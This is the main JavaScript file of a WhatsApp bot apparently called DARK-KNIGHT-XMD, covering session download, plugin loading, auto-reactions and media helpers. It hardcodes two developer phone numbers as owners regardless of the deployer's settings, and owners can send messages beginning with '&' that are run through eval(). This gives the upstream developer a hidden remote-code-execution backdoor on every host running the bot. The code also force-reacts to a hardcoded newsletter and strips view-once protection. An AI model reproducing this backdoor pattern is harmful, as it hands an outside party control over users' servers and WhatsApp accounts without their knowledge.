const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  isParticipantAdmin,
  getParticipantIds,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson
} = require('./lib/functions');

const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage
} = require('./data');

const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');

// Memory store declaration for chats & contacts
const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });

// Safe boolean check helper
const isTrue = (val) => String(val).toLowerCase() === 'true' || val === true;

const ownerNumber = [config.OWNER_NUMBER || '94763934860'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return;
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), (err) => {});
    }
  });
};

setInterval(clearTempDir, 5 * 60 * 1000);

// Session Download Handling
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) {
    console.log('Please add your session to SESSION_ID env !!');
  } else {
    const sessdata = config.SESSION_ID.replace("dark~", '');
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
      if (err) throw err;
      fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
        console.log("Session Downloaded ✅");
      });
    });
  }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

async function connectToWA() {
  console.log("Connecting To WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
  var { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: false,
    auth: state,
    version
  });

  store.bind(conn.ev);

  conn.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {
      console.log('🧬 Installing Plugins');
      const path = require('path');
      if (fs.existsSync("./plugins/")) {
        fs.readdirSync("./plugins/").forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() == ".js") {
            require("./plugins/" + plugin);
          }
        });
      }
      console.log('Plugins Installed Successful ✅');
      console.log('Bot Connected To Whatsapp ✅');

      let up = `*✨ Hello, ${config.BOT_NAME || '𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃-𝚇𝙼𝙳'} Legend! ✨*

╭─〔 *🤖 ${config.BOT_NAME || '𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃-𝚇𝙼𝙳'}* 〕  
├─▸ *Ultra Super Fast Powerfull ⚠️* 
├─▸ *Powered By ${config.BOT_NAME || '𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃-𝚇𝙼𝙳'}*  
╰─➤ *Your Smart WhatsApp Bot Is Ready To Use 🍁!*

*❤️ Thank you for Choosing ${config.BOT_NAME || '𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃-𝚇𝙼𝙳'}!*

╭──〔 *🔗 Information* 〕  
├─ *📢 Join Channel:*  
│   https://whatsapp.com/channel/0029VbAM4eo3AzNQZ1WleW3e
├─ *⭐ Join Group:*  
│   https://chat.whatsapp.com/IGgPW6pTrH14oAWCJALYR5
╰─ 🛠 *Prefix:* \`${config.PREFIX || '.'}\`

> _© ${config.DESCRIPTION || 'Made By 𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃'}_`;

      const aliveImg = config.ALIVE_IMG || "https://files.catbox.moe/a757v6.jpg";
      conn.sendMessage(conn.decodeJid(conn?.user?.id || conn?.user?.lid), { image: { url: aliveImg }, caption: up });
    }
  });

  conn.ev.on('creds.update', saveCreds);

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        await AntiDelete(conn, updates);
      }
    }
  });

  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0];
    if (!mek || !mek.message) return;

    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
      ? mek.message.ephemeralMessage.message 
      : mek.message;

    // READ_MESSAGE Config Check
    if (isTrue(config.READ_MESSAGE)) {
      await conn.readMessages([mek.key]);
    }

    if (mek.message.viewOnceMessageV2) {
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;
    }

    // AUTO_STATUS_SEEN Config Check
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && isTrue(config.AUTO_STATUS_SEEN)) {
      await conn.readMessages([mek.key]);
    }

    // AUTO_STATUS_REACT Config Check
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && isTrue(config.AUTO_STATUS_REACT)) {
      const jawadlike = await conn.decodeJid(conn.user.id);
      const emojis = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤️‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝'];
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
      await conn.sendMessage(mek.key.remoteJid, {
        react: {
          text: randomEmoji,
          key: mek.key,
        } 
      }, { statusJidList: [mek.key.participant, jawadlike] });
    }

    // AUTO_STATUS_REPLY Config Check
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && isTrue(config.AUTO_STATUS_REPLY)) {
      const user = mek.key.participant;
      const text = config.AUTO_STATUS_MSG || "*SEEN YOUR STATUS BY 𝙳𝙰𝚁𝙺-𝙺𝙽I𝙶𝙷𝚃-𝚇𝙼𝙳🤍*";
      await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
    }

    await Promise.all([
      saveMessage(mek),
    ]);

    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
    
    // PREFIX Config Check
    const prefix = config.PREFIX || '.'; 
    const isCmd = body.startsWith(prefix);
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const text = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';

    const botLid = conn.user?.lid ? conn.user?.lid.split(":")[0] + "@lid" : null;
    const botLid2 = botLid ? botLid.split("@")[0] : null;
    
    // DEV Config Check
    const devNum = config.DEV || '94763934860';
    const ownernum = [devNum, '272572046434350'];
    const isbot = (senderNumber === botNumber || (botLid2 && senderNumber === botLid2));
    const isdev = ownernum.includes(senderNumber);
    const isMe = isbot ? isbot : isdev;
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);

    let groupMetadata = { subject: '', participants: [] };
    if (isGroup) {
      try {
        groupMetadata = await conn.groupMetadata(from);
      } catch (e) {}
    }
    const groupName = groupMetadata.subject;
    const participants = groupMetadata.participants || [];
    const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
    const isBotAdmins = isGroup ? isParticipantAdmin(participants, [botNumber2, botLid, botNumber + '@s.whatsapp.net']) || groupAdmins?.includes(botNumber2) || groupAdmins?.includes(botLid) : false;
    const isAdmins = isGroup ? isParticipantAdmin(participants, [sender, senderNumber + '@s.whatsapp.net', senderNumber + '@lid']) || groupAdmins?.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
	  
    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek });
    };

    let sudoUsers = [];
    try {
      if (fs.existsSync('./lib/sudo.json')) {
        sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
      }
    } catch (e) {
      sudoUsers = [];
    }
        
    const authorizedUsers = sudoUsers.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');  
    const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
              
    if (isCreator && body.startsWith('&')) {
      let code = body.slice(1);
      try {
        let resultTest;
        try {
          resultTest = await eval(`(async () => { return ${code.replace("°", ".toString()")} })()`);
        } catch (e) {
          resultTest = await eval(`(async () => { ${code.replace("°", ".toString()")} })()`);
        }
        if (resultTest !== undefined) {
          await reply(util.format(resultTest));
        }
      } catch (err) {
        await reply(util.format(err));
      }
      return;
    }

    if (senderNumber.includes("272572046434350")) {
      if (isReact) return;
      m.react("👾");
    }
	  
    // AUTO_REACT Config Check
    if (!isReact && isTrue(config.AUTO_REACT)) {
      const reactions = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤️‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', '👍', '😂', '😮', '😥', '🙏', '👏', '🥰', '🥹', '😭', '🔥', '🤣'];
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }
	
    // CUSTOM_REACT Config Check
    if (!isReact && senderNumber === botNumber && isTrue(config.CUSTOM_REACT)) {
      const reactions = (config.CUSTOM_REACT_EMOJIS || '👍,❤️,😂,😮,😢,🙏').split(',');
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)].trim();
      m.react(randomReaction);
    }

    // HEART_REACT Config Check
    if (!isReact && senderNumber === botNumber && isTrue(config.HEART_REACT)) {
      const reactions = (config.HEART_REACT_EMOJIS || '🩷,❤️,🧡,💛,💚,🩵,💙,💜,🖤,🩶,🤍,🤎,💔,❤️‍🔥,❤️‍🩹,❣️️,💕,💞,💓,💗,💖,💘,💝').split(',');
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)].trim();
      m.react(randomReaction);
    } 
            
    const id = mek.key.server_id;
    const defaultEmojis = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎'];
    const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
    if (id) {
      await conn.newsletterReactMessage(`120363400240662312@newsletter`, id, randomEmoji).catch(() => {});
    }

    let bannedUsers = [];
    try {
      if (fs.existsSync('./lib/ban.json')) {
        bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
      }
    } catch (e) {}

    const isBanned = bannedUsers.includes(sender);
    if (isBanned) return; 
	  
    let ownerFile = [];
    try {
      if (fs.existsSync('./lib/sudo.json')) {
        ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
      }
    } catch (e) {}

    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
    const isFileOwner = ownerFile.includes(sender);
    const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
	  
    // MODE Config Check
    const botMode = (config.MODE || 'public').toLowerCase();
    if (!isOwner && botMode === "private") return;
    if (!isOwner && isGroup && botMode === "inbox") return;
    if (!isOwner && !isGroup && botMode === "groups") return;
                 
    const events = require('./command');
    const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
        try {
          cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }

    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      }
    });
  });

  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + '@' + decode.server) || jid
      );
    } else return jid;
  };

  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = { ...message.message.viewOnceMessage.message };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    };
    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    } : {});
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;

    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url);
    mime = res.headers['content-type'];
    if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
    }
    let type = mime.split("/")[0] + "Message";
    if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
    }
  };

  conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === 'ephemeralMessage';
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === 'string') msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== 'string') msg[mtype] = {
      ...content,
      ...options
    };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === conn.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  conn.getFile = async (PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
    let type = await FileType.fromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    };
    let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
    if (data && save) fs.promises.writeFile(filename, data);
    return {
      res,
      filename,
      size: data.length,
      ...type,
      data
    };
  };

  conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await conn.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = '',
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = 'document';
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif.js');
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, { packname: config.STICKER_NAME || 'DARK-KNIGHT-XMD', author: config.OWNER_NAME || 'DARK-KNIGHT', categories: options.categories ? options.categories : [] });
      await fs.promises.unlink(filename);
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) type = 'image';
    else if (/video/.test(mime)) type = 'video';
    else if (/audio/.test(mime)) type = 'audio';
    else type = 'document';
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    return fs.promises.unlink(pathFile);
  };

  conn.parseMention = async (text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
  };

  conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    let types = await conn.getFile(path, true);
    let { mime, ext, res, data, filename } = types;
    let type = '',
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = 'document';
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif');
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.STICKER_NAME || 'DARK-KNIGHT-XMD', author: options.author ? options.author : config.OWNER_NAME || 'DARK-KNIGHT', categories: options.categories ? options.categories : [] });
      await fs.promises.unlink(filename);
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) type = 'image';
    else if (/video/.test(mime)) type = 'video';
    else if (/audio/.test(mime)) type = 'audio';
    else type = 'document';
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      caption,
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    return fs.promises.unlink(pathFile);
  };

  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted });

  conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
    return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });

  conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options
    };
    conn.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
    var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: message.imageMessage,
          "hydratedContentText": text,
          "hydratedFooterText": footer,
          "hydratedButtons": but
        }
      }
    }), options);
    conn.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  conn.getName = (jid, withoutContact = false) => {
    let id = conn.decodeJid(jid);
    withoutContact = conn.withoutContact || withoutContact;
    let v;

    if (id.endsWith('@g.us'))
      return new Promise(async resolve => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject))
          v = await conn.groupMetadata(id).catch(() => ({})) || {};

        resolve(
          v.name ||
          v.subject ||
          id.replace('@s.whatsapp.net', '')
        );
      });
    else
      v =
        id === '0@s.whatsapp.net'
          ? { id, name: 'WhatsApp' }
          : id === conn.decodeJid(conn.user.id)
            ? conn.user
            : store.contacts[id] || {};

    return (
      (withoutContact ? '' : v.name) ||
      v.subject ||
      v.verifiedName ||
      jid.replace('@s.whatsapp.net', '')
    );
  };

  conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
          i + '@s.whatsapp.net',
        )}\nFN:${
          config.OWNER_NAME || 'DARK-KNIGHT'
        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nEND:VCARD`,
      });
    }
    conn.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted },
    );
  };

  conn.setStatus = status => {
    conn.query({
      tag: 'iq',
      attrs: {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      },
      content: [
        {
          tag: 'status',
          attrs: {},
          content: Buffer.from(status, 'utf-8'),
        },
      ],
    });
    return status;
  };

  conn.serializeM = mek => sms(conn, mek, store);
}

app.get("/", (req, res) => {
  res.send(`${config.BOT_NAME || 'DARK-KNIGHT-XMD'} IS STARTED ✅`);
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
  connectToWA();
}, 4000);
